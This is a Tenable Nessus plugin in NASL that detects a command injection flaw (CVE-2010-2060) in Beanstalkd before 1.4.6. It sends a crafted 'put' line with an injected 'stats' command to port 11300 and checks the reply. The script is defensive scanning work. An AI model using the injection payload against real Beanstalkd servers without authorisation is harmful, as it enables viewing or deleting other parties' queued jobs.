#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(46884);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/04/27 19:46:26 $");

  script_cve_id("CVE-2010-2060");
  script_bugtraq_id(40516);
  script_osvdb_id(65113);
  script_xref(name:"Secunia", value:"40032");

  script_name(english:"Beanstalkd < 1.4.6 Remote Beanstalkd Command Injection");
  script_summary(english:"Exploits the command injection issue.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that may allow modification of
data via a restricted set of commands.");
  script_set_attribute(attribute:"description", value:
"The installed version of Beanstalkd allows injection of Beanstalk
commands. 

A malicious producer process or client could exploit this issue to
inject arbitrary beanstalkd commands via the 'PUT' command to view
status of existing jobs or delete jobs from the Beanstalkd queue
without co-operation from the consumer process or the client.");

  script_set_attribute(attribute:"see_also", value:"http://kr.github.io/beanstalkd/2010/05/23/1.4.6-release-notes.html");
  script_set_attribute(attribute:"see_also", value:"http://bugs.gentoo.org/show_bug.cgi?id=322457");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.4.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/05/23");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/05/23");
  script_set_attribute(attribute:"plugin_publication_date",value:"2010/06/14");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");
  script_family(english:"Misc.");

  script_dependencies("beanstalkd_detect.nasl");
  script_require_ports("Services/beanstalkd", 11300);
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"beanstalkd", default:11300, exit_on_fail:TRUE);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Could not open socket on port "+ port +".");;

# Set a high job size, and then later pass the beanstalkd 'stats'
# command.
exploit = "put 0 0 10 65536" + '\r\n' + "stats" + '\r\n';

send(socket:soc, data:exploit);
res = recv(socket:soc, min:500, length:1024);
close(soc);

if(strlen(res) == 0) exit(1, "The service listening on port " + port + " failed to respond.");

# If we see JOB_TOO_BIG and the result of 
# stats command, then report...

if (
  strlen(res) >= 75 && 
  'JOB_TOO_BIG' >< res &&
  "OK"  >< res && 
  "---" >< res && 
  "current-jobs-urgent:"   >< res &&
  "current-jobs-ready:"    >< res &&
  "current-jobs-reserved:" >< res
)
{
  if (report_verbosity > 0)
  { 
    report = '\n' +
      'Nessus was able to exploit the issue by sending the following ' + '\n' +
      "'put' request :" +  '\n\n' +
      exploit ;

   if (report_verbosity > 1)
   {
     report += '\n' +
       "Here's the response : "+ '\n\n' +
       res +
       '\n';
   }  
   security_hole(port:port,extra:report);
  }
  else
    security_hole(port);
  exit(0);
}
else exit(0, "The Beanstalk daemon listening on port "+ port + " is not affected.");
